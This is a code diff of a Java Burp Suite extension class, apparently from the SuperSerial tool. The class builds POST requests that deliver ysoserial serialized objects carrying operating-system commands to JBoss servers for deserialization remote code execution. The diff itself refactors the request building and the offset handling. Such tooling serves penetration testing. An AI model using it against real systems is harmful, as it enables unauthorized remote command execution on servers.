@@ -1,7 +1,7 @@
 /*
 	JBossSerializedInsertionPoint.java
 	
-	v0.1 (12/2/2015)
+	v0.5 (11/22/2016)
 	
 	Custom insertion point for Java Deserialization Remote Code Execution, specifically against the JBoss platform. Accepts a serialized object containing
 	an operating system command from ysoserial and generates a POST request containing the object.
@@ -17,15 +17,16 @@ public class JBossSerializedInsertionPoint implements IScannerInsertionPoint {
 	private String insertionPointName;
 	private IExtensionHelpers helpers;
 	
-	public JBossSerializedInsertionPoint(IExtensionHelpers h,IHttpRequestResponse baseRR) {
+	static final String CONTENT_TYPE = "application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue";
+	
+	public JBossSerializedInsertionPoint(IExtensionHelpers h,IHttpRequestResponse baseRR) { //TODO: pass in IBurpExtenderCallbacks rather than IExtensionHelpers
 		baseRequestResponse = baseRR;
 		baseValue = ""; //not sure what to do with this yet
 		insertionPointName = "SuperSerial-JBoss";
 		helpers = h;
 	}
 	
-	@Override
-	public byte[] buildRequest(byte[] payload) {
+	private byte[] buildExploitRequest(byte[] payload) {
 		IRequestInfo baseReqInfo = helpers.analyzeRequest(baseRequestResponse);
 		List<String> headers = baseReqInfo.getHeaders();
 		String method = baseReqInfo.getMethod();
@@ -57,8 +58,15 @@ public class JBossSerializedInsertionPoint implements IScannerInsertionPoint {
 		}
 		
 		//add correct content-type header and return
-		headers.add("Content-Type: application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue");
+		headers.add("Content-Type: "+CONTENT_TYPE);
 		return helpers.buildHttpMessage(headers,payload);
+	}
+	
+	
+	//IScannerInsertionPoint methods
+	@Override
+	public byte[] buildRequest(byte[] payload) {
+		return buildExploitRequest(payload);
 	}
 	
 	@Override
@@ -78,8 +86,9 @@ public class JBossSerializedInsertionPoint implements IScannerInsertionPoint {
 	
 	@Override
 	public int[] getPayloadOffsets(byte[] payload) {
-		IRequestInfo baseReqInfo = helpers.analyzeRequest(baseRequestResponse);
-		int dataStart = baseReqInfo.getBodyOffset();
-		return new int[] {dataStart,dataStart+payload.length};
+		byte[] exploitReq = buildExploitRequest(payload);
+		IRequestInfo exploitReqInfo = helpers.analyzeRequest(exploitReq);
+		int dataStart = exploitReqInfo.getBodyOffset();
+		return new int[] {dataStart,exploitReq.length};
 	}
 }
